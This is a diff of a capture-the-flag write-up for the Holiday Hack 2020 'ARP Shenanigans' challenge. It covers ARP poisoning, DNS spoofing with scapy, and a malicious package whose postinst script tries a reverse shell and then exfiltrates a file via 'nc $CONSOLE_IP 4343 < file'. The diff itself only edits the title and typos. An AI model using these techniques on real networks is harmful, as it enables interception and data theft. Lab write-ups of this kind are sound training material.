@@ -1,4 +1,4 @@
-# ARP Shenanigans - (Arping Aroubd)
+# Objective 9 - ARP Shenanigans
 This challenge required spoofing and end point by launching an ARP poisoning attack, DNS hijacking, and endpoint impersonation to get the victim to download a malicious file and execute malicious code. This challenge can was broken down into stages. Each step required a different attack to advance the overall campaign. The end goal, is to exfiltrate the contents of the file `/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt` on the victim machine.
 ## Initial Enumeration
 Initially enumerating the machine provided, some observations can be made about what how this challenge will unfold.
@@ -87,7 +87,7 @@ These changes have been replicated into [arp_res.py](arp_res.py) python script.
 After poisoning the ARP request/response flow, the victim then issues a DNS request to the poisoned address. This validates the first guess during enumeration that DNS spoofing would be required.
 ![ARP Poisoning](img/arp_poison_success.png)
 ## DNS Spoofing
-The next step now that the ARP request/response has been hijacked is to respond to the DNS request with the attacker address. In this case, the DNS response will point to the 'real' IP address of the attacker rather than rely on the ARP cache fo rthe DNS server address which was spoofed earlier.
+The next step now that the ARP request/response has been hijacked is to respond to the DNS request with the attacker address. In this case, the DNS response will point to the 'real' IP address of the attacker rather than rely on the ARP cache fo DNS server address which was spoofed earlier.
 ### DNS Resquest
 The DNS request was dumped in a modified version of `dns_res.py` to see fields in `scapy` terms. Interestingly, its going to what might be an FTP site. Which may mean the next stage is an FTP connection on port 21.
 ```
@@ -119,7 +119,7 @@ The DNS request was dumped in a modified version of `dns_res.py` to see fields i
 
 ```
 ### DNS Response
-The ARP and UDP portions of the packets where pretty stright forward to pull from the incoming packet and populate. The DNS response for the most part was just copied from the initial request, the only section being added is the answer field via a `DNSRR`. In this case, the response will want to respond with and `A` record and the `rdata` set to the attacker legimitate IP address. Fun fact, if you pass `type="CNAME"` rather than `A`, the [challenge crashes](https://github.com/CounterHack/HolidayHack2020/issues/34).
+The ARP and UDP portions of the packets where pretty straight forward to pull from the incoming packet and populate. The DNS response for the most part was just copied from the initial request, the only section being added is the answer field via a `DNSRR`. In this case, the response will want to respond with and `A` record and the `rdata` set to the attacker legitimate IP address. Fun fact, if you pass `type="CNAME"` rather than `A`, the [challenge crashes](https://github.com/CounterHack/HolidayHack2020/issues/34).
 ```
 ###[ DNS ]### 
            id        = 0
@@ -221,3 +221,4 @@ Reverse shell failure. For whatever reason the reverse shell reaches back and cr
 ![Reverse Shell Fail](img/reverse_shell_fail.png)
 Since the netcat process was able to open a session, it may be possible to cat out the contents to the target file before the session gets killed. This is done by modifying the `postinst` script to read the file rather then exec a reverse shell. `nc $CONSOLE_IP 4343 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`. After making these changes the contents of the file are captured by the netcat listener!
 ![Success](img/success.png)
+
